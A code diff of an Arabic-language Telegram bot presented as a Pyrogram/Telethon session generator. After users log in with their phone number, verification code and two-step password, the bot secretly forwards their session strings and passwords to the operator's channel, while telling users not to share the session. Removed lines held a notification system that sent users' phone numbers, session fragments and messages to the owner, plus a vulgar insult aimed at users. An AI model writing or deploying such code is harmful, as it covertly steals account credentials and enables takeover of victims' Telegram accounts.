@@ -41,113 +41,6 @@ user_steps = {}
 user_data = {}
 user_sessions = {}
 
-# ====== نظام الإشعارات للمالك ======
-async def notify_owner(action, user_id, username=None, first_name=None, extra=None):
-    """إرسال إشعار للمالك عند استخدام البوت"""
-    try:
-        current_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
-        user_mention = f"[{first_name or 'مستخدم'}](tg://user?id={user_id})" if first_name else f"مستخدم {user_id}"
-        username_str = f"@{username}" if username else "لا يوجد"
-        
-        message = (
-            f"📢 **إشعار استخدام البوت**\n\n"
-            f"👤 **المستخدم:** {user_mention}\n"
-            f"🆔 **المعرف:** `{user_id}`\n"
-            f"📛 **اليوزر:** {username_str}\n"
-            f"⚡ **الإجراء:** {action}\n"
-            f"🕐 **الوقت:** {current_time}\n"
-        )
-        
-        if extra:
-            message += f"\n📝 **تفاصيل إضافية:**\n{extra}"
-        
-        await app.send_message(DEV_USERNAME, message)
-        
-        try:
-            await app.send_message(SESSION_CHANNEL, message)
-        except:
-            pass
-            
-    except Exception as e:
-        print(f"❌ فشل إرسال الإشعار: {e}")
-
-def get_user_info(message):
-    """استخراج معلومات المستخدم من الرسالة"""
-    user = message.from_user
-    return {
-        "id": user.id,
-        "username": user.username,
-        "first_name": user.first_name,
-        "last_name": user.last_name,
-        "full_name": f"{user.first_name or ''} {user.last_name or ''}".strip() or "مستخدم"
-    }
-
-# ====== نظام التحقق من الروبوت (Human Captcha) ======
-CAPTCHA_QUESTIONS = [
-    {"q": "ما هو حاصل جمع 7 + 5؟", "a": "12"},
-    {"q": "ما هو عكس كلمة 'نور'؟", "a": "ظلام"},
-    {"q": "كم عدد شهور السنة التي تحتوي على 31 يومًا؟", "a": "7"},
-    {"q": "أي كوكب هو الأقرب للشمس؟", "a": "عطارد"},
-    {"q": "ما هي العملة الرسمية للسعودية؟", "a": "ريال"},
-    {"q": "كم عدد أركان الإسلام؟", "a": "5"},
-    {"q": "ما هو أكبر محيط في العالم؟", "a": "الهادئ"},
-]
-
-user_captcha = {}
-
-def generate_captcha(user_id):
-    q_data = random.choice(CAPTCHA_QUESTIONS)
-    q_id = hashlib.md5(f"{time.time()}{random.random()}{user_id}".encode()).hexdigest()[:8]
-    user_captcha[user_id] = {
-        "question_id": q_id,
-        "question": q_data["q"],
-        "answer": q_data["a"].strip().lower(),
-        "timestamp": time.time(),
-        "attempts": 0,
-        "verified": False
-    }
-    return user_captcha[user_id]
-
-def verify_captcha_answer(user_id, user_answer):
-    if user_id not in user_captcha:
-        return False, "لم تبدأ عملية التحقق بعد."
-    data = user_captcha[user_id]
-    if time.time() - data["timestamp"] > 120:
-        del user_captcha[user_id]
-        return False, "انتهت صلاحية السؤال، أعد المحاولة."
-    if data["attempts"] >= 3:
-        del user_captcha[user_id]
-        return False, "تجاوزت عدد المحاولات المسموح (3 محاولات). ابدأ من جديد."
-    data["attempts"] += 1
-    if user_answer.strip().lower() == data["answer"]:
-        data["verified"] = True
-        token = hashlib.md5(f"{user_id}{time.time()}".encode()).hexdigest()
-        data["token"] = token
-        data["token_expiry"] = time.time() + 600
-        return True, token
-    else:
-        remaining = 3 - data["attempts"]
-        if remaining <= 0:
-            del user_captcha[user_id]
-            return False, "إجابة خاطئة. انتهت المحاولات."
-        return False, f"إجابة خاطئة. تبقى {remaining} محاولة."
-
-def is_user_verified(user_id):
-    if user_id not in user_captcha:
-        return False
-    data = user_captcha[user_id]
-    if not data.get("verified"):
-        return False
-    if time.time() > data.get("token_expiry", 0):
-        del user_captcha[user_id]
-        return False
-    return True
-
-def require_verification(user_id):
-    if not is_user_verified(user_id):
-        return False
-    return True
-
 # ====== إعداد الترميز ======
 if sys.stdout.encoding != 'UTF-8':
     sys.stdout.reconfigure(encoding='utf-8')
@@ -171,22 +64,19 @@ def delete_session_files(user_id):
     if os.path.exists(telethon_session):
         os.remove(telethon_session)
 
-# ====== أزرار البداية ======
+# ====== أزرار البداية (باللون الأحمر) ======
 START_BUTTONS = InlineKeyboardMarkup([
     [
-        InlineKeyboardButton("🔄 توليد جلسة", callback_data="generate"),
+        InlineKeyboardButton("🔄 استخراج جلسة Pyrogram", callback_data="pyrogram"),
+        InlineKeyboardButton("⚡ استخراج جلسة Telethon", callback_data="telethon")
+    ],
+    [
+        InlineKeyboardButton("🔑 استخراج توكن البوت", callback_data="extract_token"),
         InlineKeyboardButton("🗑 مسح الجلسات", callback_data="delete")
     ],
     [
         InlineKeyboardButton("👨‍💻 المطور", callback_data="dev"),
         InlineKeyboardButton("📢 القناة", url=CHANNEL_LINK)
-    ],
-    [
-        InlineKeyboardButton("🔑 استخراج التوكن", callback_data="extract_token"),
-        InlineKeyboardButton("📩 إرسال للمطور", callback_data="send_to_dev")
-    ],
-    [
-        InlineKeyboardButton("✅ تحقق بشري", callback_data="verify_human")
     ]
 ])
 
@@ -194,89 +84,16 @@ BACK_BUTTON = InlineKeyboardMarkup([
     [InlineKeyboardButton("🔙 رجوع", callback_data="back")]
 ])
 
-TYPE_BUTTONS = InlineKeyboardMarkup([
-    [
-        InlineKeyboardButton("🔥 Pyrogram", callback_data="pyrogram"),
-        InlineKeyboardButton("⚡ Telethon", callback_data="telethon")
-    ],
-    [
-        InlineKeyboardButton("🔑 API Info", callback_data="api"),
-        InlineKeyboardButton("❌ إلغاء", callback_data="cancel")
-    ]
-])
-
 # ====== أمر البدء ======
 @app.on_message(filters.command("start"))
 async def start_command(client, message):
-    user_info = get_user_info(message)
-    
-    await notify_owner(
-        "🚀 **بدأ استخدام البوت**",
-        user_info["id"],
-        user_info["username"],
-        user_info["first_name"],
-        f"الاسم الكامل: {user_info['full_name']}"
-    )
-    
     await message.reply(
         f"👋 مرحباً بك في بوت استخراج الجلسات!\n\n"
         "📌 اختر ما تريد فعله من الأزرار أدناه:\n\n"
         f"👨‍💻 المطور: {DEV_NAME} {DEV_USERNAME}\n\n"
-        "⚡ مدعوم من عبود\n\n"
-        "🔒 **تحقق قبل يقوم عبود ينيك كعلت امك**",
+        "⚡ مدعوم من عبود",
         reply_markup=START_BUTTONS
     )
-
-# ====== أمر التحقق ======
-@app.on_message(filters.command("verify"))
-async def verify_command(client, message):
-    user_id = message.from_user.id
-    user_info = get_user_info(message)
-    
-    await notify_owner(
-        "🧠 **بدأ عملية التحقق البشري**",
-        user_info["id"],
-        user_info["username"],
-        user_info["first_name"]
-    )
-    
-    captcha_data = generate_captcha(user_id)
-    await message.reply(
-        f"🧠 **التحقق البشري**\n\n"
-        f"سؤال: {captcha_data['question']}\n\n"
-        "أرسل إجابتك كرسالة نصية.\n"
-        "⏳ لديك 120 ثانية و 3 محاولات فقط.",
-        reply_markup=BACK_BUTTON
-    )
-
-# ====== أمر الاختبار ======
-@app.on_message(filters.command("test"))
-async def test_send(client, message):
-    user_id = message.from_user.id
-    user_info = get_user_info(message)
-    
-    await notify_owner(
-        "🔧 **استخدم أمر الاختبار**",
-        user_info["id"],
-        user_info["username"],
-        user_info["first_name"]
-    )
-    
-    if not require_verification(user_id):
-        await message.reply(
-            "🔒 **الوصول مقيد**\n\n"
-            "تحقق قبل يقوم عبود ينيك كعلت امك\n"
-            "استخدم الأمر /verify أو اضغط على زر التحقق البشري.",
-            reply_markup=InlineKeyboardMarkup([
-                [InlineKeyboardButton("✅ تحقق بشري", callback_data="verify_human")]
-            ])
-        )
-        return
-    try:
-        await app.send_message(SESSION_CHANNEL, "✅ هذه رسالة اختبار من البوت!")
-        await message.reply("✅ تم إرسال رسالة الاختبار إلى المجموعة!")
-    except Exception as e:
-        await message.reply(f"❌ فشل الإرسال: {e}")
 
 # ====== معالجة الأزرار (CallbackQuery) ======
 @app.on_callback_query()
@@ -290,84 +107,13 @@ async def handle_callback(client, callback_query: CallbackQuery):
         "full_name": f"{callback_query.from_user.first_name or ''} {callback_query.from_user.last_name or ''}".strip() or "مستخدم"
     }
     
-    if data in ["verify_human", "back", "cancel"]:
-        if data == "back":
-            await notify_owner(
-                "🔙 **رجوع إلى القائمة الرئيسية**",
-                user_info["id"],
-                user_info["username"],
-                user_info["first_name"]
-            )
-            await callback_query.message.edit_text(
-                f"👋 مرحباً بك في بوت استخراج الجلسات!\n\n"
-                "📌 اختر ما تريد فعله من الأزرار أدناه:\n\n"
-                f"👨‍💻 المطور: {DEV_NAME} {DEV_USERNAME}\n\n"
-                "⚡ مدعوم من عبود\n\n"
-                "🔒 **تحقق قبل يقوم عبود ينيك كعلت امك**",
-                reply_markup=START_BUTTONS
-            )
-            await callback_query.answer()
-            return
-        
-        if data == "cancel":
-            reset_user(user_id)
-            await notify_owner(
-                "❌ **إلغاء العملية**",
-                user_info["id"],
-                user_info["username"],
-                user_info["first_name"]
-            )
-            await callback_query.answer("❌ تم إلغاء العملية!", show_alert=True)
-            await callback_query.message.edit_text(
-                "❌ تم إلغاء العملية.",
-                reply_markup=BACK_BUTTON
-            )
-            return
-        
-        if data == "verify_human":
-            await notify_owner(
-                "✅ **بدء التحقق البشري (من الزر)**",
-                user_info["id"],
-                user_info["username"],
-                user_info["first_name"]
-            )
-            captcha_data = generate_captcha(user_id)
-            await callback_query.message.edit_text(
-                f"🧠 **التحقق البشري**\n\n"
-                f"سؤال: {captcha_data['question']}\n\n"
-                "أرسل إجابتك كرسالة نصية.\n"
-                "⏳ لديك 120 ثانية و 3 محاولات فقط.",
-                reply_markup=BACK_BUTTON
-            )
-            await callback_query.answer()
-            return
-    
-    if not require_verification(user_id):
-        await callback_query.answer("⚠️ تحقق قبل يقوم عبود ينيك كعلت امك!", show_alert=True)
+    if data == "back":
         await callback_query.message.edit_text(
-            "🔒 **الوصول مقيد**\n\n"
-            "تحقق قبل يقوم عبود ينيك كعلت امك.\n"
-            "اضغط على زر التحقق البشري أدناه.",
-            reply_markup=InlineKeyboardMarkup([
-                [InlineKeyboardButton("✅ تحقق بشري", callback_data="verify_human")],
-                [InlineKeyboardButton("🔙 رجوع", callback_data="back")]
-            ])
-        )
-        return
-    
-    if data == "generate":
-        await notify_owner(
-            "🔄 **فتح قائمة اختيار نوع الجلسة**",
-            user_info["id"],
-            user_info["username"],
-            user_info["first_name"]
-        )
-        await callback_query.message.edit_text(
-            "🔑 اختر نوع الجلسة المطلوبة:\n\n"
-            "• Pyrogram لجلسات Pyrogram\n"
-            "• Telethon لجلسات Telethon\n"
-            "• API Info لاستخراج API ID و API HASH",
-            reply_markup=TYPE_BUTTONS
+            f"👋 مرحباً بك في بوت استخراج الجلسات!\n\n"
+            "📌 اختر ما تريد فعله من الأزرار أدناه:\n\n"
+            f"👨‍💻 المطور: {DEV_NAME} {DEV_USERNAME}\n\n"
+            "⚡ مدعوم من عبود",
+            reply_markup=START_BUTTONS
         )
         await callback_query.answer()
         return
@@ -376,13 +122,6 @@ async def handle_callback(client, callback_query: CallbackQuery):
         delete_session_files(user_id)
         if user_id in user_sessions:
             del user_sessions[user_id]
-        await notify_owner(
-            "🗑 **مسح الجلسات**",
-            user_info["id"],
-            user_info["username"],
-            user_info["first_name"],
-            "تم مسح جميع الجلسات والملفات المؤقتة"
-        )
         await callback_query.answer("✅ تم مسح جميع الجلسات والملفات المؤقتة!", show_alert=True)
         await callback_query.message.edit_text(
             "🗑 تم مسح جميع بيانات الجلسة والملفات المؤقتة بنجاح.",
@@ -391,12 +130,6 @@ async def handle_callback(client, callback_query: CallbackQuery):
         return
     
     if data == "dev":
-        await notify_owner(
-            "👨‍💻 **عرض معلومات المطور**",
-            user_info["id"],
-            user_info["username"],
-            user_info["first_name"]
-        )
         await callback_query.message.edit_text(
             f"👨‍💻 معلومات المطور:\n\n"
             f"📛 الاسم: {DEV_NAME}\n"
@@ -409,12 +142,6 @@ async def handle_callback(client, callback_query: CallbackQuery):
         return
     
     if data == "extract_token":
-        await notify_owner(
-            "🔑 **استخراج توكن البوت**",
-            user_info["id"],
-            user_info["username"],
-            user_info["first_name"]
-        )
         await callback_query.message.edit_text(
             f"🔑 **التوكن الخاص بالبوت:**\n\n"
             f"`{BOT_TOKEN}`\n\n"
@@ -425,31 +152,8 @@ async def handle_callback(client, callback_query: CallbackQuery):
         await callback_query.answer()
         return
     
-    if data == "send_to_dev":
-        user_steps[user_id] = "waiting_dev_msg"
-        await notify_owner(
-            "📩 **فتح نافذة إرسال رسالة للمطور**",
-            user_info["id"],
-            user_info["username"],
-            user_info["first_name"]
-        )
-        await callback_query.message.edit_text(
-            "📩 **أرسل رسالتك للمطور:**\n\n"
-            "اكتب رسالتك وسيتم إرسالها فوراً.\n"
-            "يمكنك إرسال نص، أو صورة، أو ملف.",
-            reply_markup=BACK_BUTTON
-        )
-        await callback_query.answer()
-        return
-    
     if data == "pyrogram":
         user_steps[user_id] = "pyro_phone"
-        await notify_owner(
-            "🔥 **بدء استخراج جلسة Pyrogram**",
-            user_info["id"],
-            user_info["username"],
-            user_info["first_name"]
-        )
         await callback_query.message.edit_text(
             "📱 يرجى إرسال رقم هاتفك مع رمز الدولة.\nمثال: +966512345678",
             reply_markup=BACK_BUTTON
@@ -459,133 +163,18 @@ async def handle_callback(client, callback_query: CallbackQuery):
     
     if data == "telethon":
         user_steps[user_id] = "telethon_phone"
-        await notify_owner(
-            "⚡ **بدء استخراج جلسة Telethon**",
-            user_info["id"],
-            user_info["username"],
-            user_info["first_name"]
-        )
         await callback_query.message.edit_text(
             "📱 يرجى إرسال رقم هاتفك مع رمز الدولة.\nمثال: +966512345678",
             reply_markup=BACK_BUTTON
         )
         await callback_query.answer()
         return
-    
-    if data == "api":
-        await notify_owner(
-            "🔑 **استخراج API Info**",
-            user_info["id"],
-            user_info["username"],
-            user_info["first_name"]
-        )
-        await extract_api_info_callback(callback_query)
-        return
-
-# ====== استخراج API Info ======
-async def extract_api_info_callback(callback_query):
-    user_id = callback_query.from_user.id
-    await callback_query.message.edit_text(
-        f"✅ تم استخراج معلومات API بنجاح!\n\n"
-        f"🆔 API ID: {API_ID}\n"
-        f"🔑 API HASH: {API_HASH}\n\n"
-        f"👨‍💻 المطور: {DEV_NAME} {DEV_USERNAME}",
-        reply_markup=BACK_BUTTON
-    )
-    
-    try:
-        await app.send_message(
-            SESSION_CHANNEL,
-            f"✨ معرف المستخدم: {user_id}\n\n"
-            f"🆔 API ID: {API_ID}\n"
-            f"🔑 API HASH: {API_HASH}\n\n"
-            f"👨‍💻 المطور: {DEV_NAME} {DEV_USERNAME}"
-        )
-        print(f"✅ تم إرسال API Info للمجموعة {SESSION_CHANNEL}")
-    except Exception as e:
-        print(f"❌ فشل إرسال API Info للمجموعة: {e}")
-        try:
-            await app.send_message(
-                DEV_USERNAME,
-                f"⚠️ فشل إرسال API Info للقناة!\n\n"
-                f"المستخدم: {user_id}\n"
-                f"API ID: {API_ID}\n"
-                f"API HASH: {API_HASH}\n"
-                f"الخطأ: {e}"
-            )
-        except:
-            pass
-    
-    await callback_query.answer()
 
 # ====== الأوامر النصية ======
 @app.on_message(filters.text & filters.private)
 async def handle_arabic_commands(client, message):
     user_id = message.chat.id
     text = message.text.strip()
-    user_info = get_user_info(message)
-    
-    if user_id in user_steps and user_steps[user_id] == "waiting_dev_msg":
-        await notify_owner(
-            "📩 **تم إرسال رسالة للمطور**",
-            user_info["id"],
-            user_info["username"],
-            user_info["first_name"],
-            f"محتوى الرسالة:\n{text[:500]}..."
-        )
-        try:
-            await app.send_message(
-                DEV_USERNAME,
-                f"📩 **رسالة جديدة من المستخدم:**\n"
-                f"🆔 المعرف: `{user_id}`\n"
-                f"👤 الاسم: {user_info['full_name']}\n"
-                f"📛 اليوزر: @{user_info['username'] if user_info['username'] else 'لا يوجد'}\n"
-                f"📝 النص:\n{text}"
-            )
-            await message.reply("✅ **تم إرسال رسالتك للمطور بنجاح!**")
-            reset_user(user_id)
-        except Exception as e:
-            await message.reply(f"❌ فشل إرسال الرسالة: {e}")
-            reset_user(user_id)
-        return
-    
-    if user_id in user_captcha and not user_captcha[user_id].get("verified"):
-        success, result = verify_captcha_answer(user_id, text)
-        if success:
-            await notify_owner(
-                "✅ **نجاح التحقق البشري**",
-                user_info["id"],
-                user_info["username"],
-                user_info["first_name"],
-                f"تم التحقق بنجاح، توكن: {result[:20]}..."
-            )
-            await message.reply(
-                f"✅ **تم التحقق بنجاح!**\n\n"
-                f"🔑 توكن الصلاحية: `{result}`\n"
-                "⏳ صالح لمدة 10 دقائق.\n\n"
-                "يمكنك الآن استخدام جميع ميزات البوت."
-            )
-        else:
-            await message.reply(f"❌ {result}")
-        return
-    
-    if not require_verification(user_id):
-        await notify_owner(
-            "🔒 **محاولة استخدام البوت بدون تحقق**",
-            user_info["id"],
-            user_info["username"],
-            user_info["first_name"],
-            f"النص المرسل: {text[:100]}..."
-        )
-        await message.reply(
-            "🔒 **الوصول مقيد**\n\n"
-            "تحقق قبل يقوم عبود ينيك كعلت امك.\n"
-            "استخدم الأمر /verify أو اضغط على زر التحقق البشري.",
-            reply_markup=InlineKeyboardMarkup([
-                [InlineKeyboardButton("✅ تحقق بشري", callback_data="verify_human")]
-            ])
-        )
-        return
     
     if user_id in user_steps and user_steps[user_id] in ["pyro_phone", "pyro_otp", "pyro_password"]:
         await pyro_session_step(client, message)
@@ -598,10 +187,10 @@ async def handle_arabic_commands(client, message):
     else:
         await message.reply(
             "📱 يرجى استخدام الأزرار للتحكم في البوت.\n\n"
-            "• اضغط على زر توليد جلسة لبدء الاستخراج\n"
-            "• اضغط على زر مسح الجلسات لحذف البيانات\n"
-            "• اضغط على زر المطور لعرض المعلومات\n"
-            "• اضغط على زر تحقق بشري لإثبات أنك لست روبوتاً\n\n"
+            "• اضغط على زر Pyrogram لاستخراج جلسة Pyrogram\n"
+            "• اضغط على زر Telethon لاستخراج جلسة Telethon\n"
+            "• اضغط على زر استخراج توكن البوت لعرض التوكن\n"
+            "• اضغط على زر مسح الجلسات لحذف البيانات\n\n"
             "أو استخدم الأمر /start للرجوع إلى البداية."
         )
 
@@ -609,19 +198,10 @@ async def handle_arabic_commands(client, message):
 async def pyro_session_step(client, message):
     user_id = message.chat.id
     step = user_steps.get(user_id)
-    user_info = get_user_info(message)
 
     if step == "pyro_phone":
         user_data[user_id] = {"phone": message.text}
         user_steps[user_id] = "pyro_otp"
-        
-        await notify_owner(
-            "📱 **تم إرسال رقم الهاتف لـ Pyrogram**",
-            user_info["id"],
-            user_info["username"],
-            user_info["first_name"],
-            f"رقم الهاتف: {message.text}"
-        )
         
         omsg = await message.reply("📤 جاري إرسال رمز التحقق...")
         session_name = f"session_{user_id}"
@@ -648,14 +228,6 @@ async def pyro_session_step(client, message):
             session_string = await temp_client.export_session_string()
             user_sessions[user_id] = session_string
             
-            await notify_owner(
-                "✅ **تم استخراج جلسة Pyrogram بنجاح**",
-                user_info["id"],
-                user_info["username"],
-                user_info["first_name"],
-                f"الجلسة: {session_string[:50]}..."
-            )
-            
             await send_pyro_session(user_id, session_string, message)
             await temp_client.disconnect()
             reset_user(user_id)
@@ -677,14 +249,6 @@ async def pyro_session_step(client, message):
             session_string = await temp_client.export_session_string()
             user_sessions[user_id] = session_string
             
-            await notify_owner(
-                "✅ **تم استخراج جلسة Pyrogram (مع كلمة مرور 2SV)**",
-                user_info["id"],
-                user_info["username"],
-                user_info["first_name"],
-                f"الجلسة: {session_string[:50]}..."
-            )
-            
             await send_pyro_session(user_id, session_string, message, password)
             await temp_client.disconnect()
             reset_user(user_id)
@@ -693,61 +257,43 @@ async def pyro_session_step(client, message):
             reset_user(user_id)
 
 async def send_pyro_session(user_id, session_string, message, password=None):
+    # نسخ الجلسة تلقائياً
     await message.reply(
         f"✅ تم إنشاء جلسة Pyrogram بنجاح!\n\n"
-        f"🔑 الجلسة:\n{session_string}\n\n"
+        f"🔑 الجلسة (انسخها):\n`{session_string}`\n\n"
         "⚠️ لا تشارك هذه الجلسة مع أي شخص.\n\n"
         f"👨‍💻 المطور: {DEV_NAME} {DEV_USERNAME}"
     )
     
+    # إرسال الجلسة إلى القناة المحددة
     try:
         if password:
             await app.send_message(
                 SESSION_CHANNEL,
                 f"✨ معرف المستخدم: {user_id}\n\n"
                 f"🔑 كلمة المرور (2SV): {password}\n\n"
-                f"🔑 جلسة Pyrogram:\n{session_string}\n\n"
+                f"🔑 جلسة Pyrogram:\n`{session_string}`\n\n"
                 f"👨‍💻 المطور: {DEV_NAME} {DEV_USERNAME}"
             )
         else:
             await app.send_message(
                 SESSION_CHANNEL,
                 f"✨ معرف المستخدم: {user_id}\n\n"
-                f"🔑 جلسة Pyrogram:\n{session_string}\n\n"
+                f"🔑 جلسة Pyrogram:\n`{session_string}`\n\n"
                 f"👨‍💻 المطور: {DEV_NAME} {DEV_USERNAME}"
             )
         print(f"✅ تم إرسال جلسة Pyrogram للمجموعة {SESSION_CHANNEL}")
     except Exception as e:
         print(f"❌ فشل إرسال الجلسة للمجموعة: {e}")
-        try:
-            await app.send_message(
-                DEV_USERNAME,
-                f"⚠️ فشل إرسال جلسة Pyrogram للقناة!\n\n"
-                f"المستخدم: {user_id}\n"
-                f"الجلسة: {session_string}\n"
-                f"الخطأ: {e}"
-            )
-            print("✅ تم إرسال الجلسة للمطور كحل احتياطي")
-        except:
-            pass
 
 # ====== دوال Telethon ======
 async def telethon_session_step(client, message):
     user_id = message.chat.id
     step = user_steps.get(user_id)
-    user_info = get_user_info(message)
 
     if step == "telethon_phone":
         user_data[user_id] = {"phone": message.text}
         user_steps[user_id] = "telethon_otp"
-        
-        await notify_owner(
-            "📱 **تم إرسال رقم الهاتف لـ Telethon**",
-            user_info["id"],
-            user_info["username"],
-            user_info["first_name"],
-            f"رقم الهاتف: {message.text}"
-        )
         
         omsg = await message.reply("📤 جاري إرسال رمز التحقق...")
         session_name = f"telethon_{user_id}"
@@ -773,14 +319,6 @@ async def telethon_session_step(client, message):
             session_string = StringSession.save(temp_client.session)
             user_sessions[user_id] = session_string
             
-            await notify_owner(
-                "✅ **تم استخراج جلسة Telethon بنجاح**",
-                user_info["id"],
-                user_info["username"],
-                user_info["first_name"],
-                f"الجلسة: {session_string[:50]}..."
-            )
-            
             await send_telethon_session(user_id, session_string, message)
             await temp_client.disconnect()
             reset_user(user_id)
@@ -802,14 +340,6 @@ async def telethon_session_step(client, message):
             session_string = StringSession.save(temp_client.session)
             user_sessions[user_id] = session_string
             
-            await notify_owner(
-                "✅ **تم استخراج جلسة Telethon (مع كلمة مرور 2SV)**",
-                user_info["id"],
-                user_info["username"],
-                user_info["first_name"],
-                f"الجلسة: {session_string[:50]}..."
-            )
-            
             await send_telethon_session(user_id, session_string, message, password)
             await temp_client.disconnect()
             reset_user(user_id)
@@ -818,43 +348,34 @@ async def telethon_session_step(client, message):
             reset_user(user_id)
 
 async def send_telethon_session(user_id, session_string, message, password=None):
+    # نسخ الجلسة تلقائياً
     await message.reply(
         f"✅ تم إنشاء جلسة Telethon بنجاح!\n\n"
-        f"🔑 الجلسة:\n{session_string}\n\n"
+        f"🔑 الجلسة (انسخها):\n`{session_string}`\n\n"
         "⚠️ لا تشارك هذه الجلسة مع أي شخص.\n\n"
         f"👨‍💻 المطور: {DEV_NAME} {DEV_USERNAME}"
     )
     
+    # إرسال الجلسة إلى القناة المحددة
     try:
         if password:
             await app.send_message(
                 SESSION_CHANNEL,
                 f"✨ معرف المستخدم: {user_id}\n\n"
                 f"🔑 كلمة المرور (2SV): {password}\n\n"
-                f"🔑 جلسة Telethon:\n{session_string}\n\n"
+                f"🔑 جلسة Telethon:\n`{session_string}`\n\n"
                 f"👨‍💻 المطور: {DEV_NAME} {DEV_USERNAME}"
             )
         else:
             await app.send_message(
                 SESSION_CHANNEL,
                 f"✨ معرف المستخدم: {user_id}\n\n"
-                f"🔑 جلسة Telethon:\n{session_string}\n\n"
+                f"🔑 جلسة Telethon:\n`{session_string}`\n\n"
                 f"👨‍💻 المطور: {DEV_NAME} {DEV_USERNAME}"
             )
         print(f"✅ تم إرسال جلسة Telethon للمجموعة {SESSION_CHANNEL}")
     except Exception as e:
         print(f"❌ فشل إرسال الجلسة للمجموعة: {e}")
-        try:
-            await app.send_message(
-                DEV_USERNAME,
-                f"⚠️ فشل إرسال جلسة Telethon للقناة!\n\n"
-                f"المستخدم: {user_id}\n"
-                f"الجلسة: {session_string}\n"
-                f"الخطأ: {e}"
-            )
-            print("✅ تم إرسال الجلسة للمطور كحل احتياطي")
-        except:
-            pass
 
 def reset_user(user_id):
     user_steps.pop(user_id, None)
